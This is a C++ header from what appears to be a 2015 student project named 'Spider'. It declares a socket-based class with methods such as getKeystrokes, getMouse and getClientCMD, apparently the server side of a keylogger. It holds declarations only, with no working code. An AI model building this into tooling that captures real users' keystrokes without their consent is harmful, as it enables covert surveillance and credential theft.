//
// Spider.hh for epitech in /home/chapui_s/rendu/
//
// Made by chapui_s
// Login   <chapui_s@epitech.eu>
//
// Started on  Wed Oct 21 09:14:52 2015 chapui_s
// Last update Tue Oct 27 17:06:12 2015 bresci_b bresci_b
//

#ifndef SPIDER_H_
# define SPIDER_H_

# include <boost/shared_ptr.hpp>
# include <boost/enable_shared_from_this.hpp>
# include <string>
# include "ISocketEngine.hh"
# include "debug.hh"
# include "Buffer.hh"
# include "Json.hh"

class	Web;

class					Spider : public boost::enable_shared_from_this<Spider>
{
private:
  boost::shared_ptr<ISocketEngine>	_socket;
  Web					&_web;
  char					_str[2014];
  Buffer				_buffer;

  uint16_t				_proto;
  std::string				_name;
  Json					*_json;

public:
  Spider(const boost::shared_ptr<ISocketEngine> &, Web &);
  virtual ~Spider();

  void		prepareFirstConnection();
  void		doFirstConnection();
  void		dieInDignity();
  void		getTypeInfo();
  void		getKeystrokes();
  void		getMouse();
  void		getClientCMD();
};

#endif /* !SPIDER_H_ */
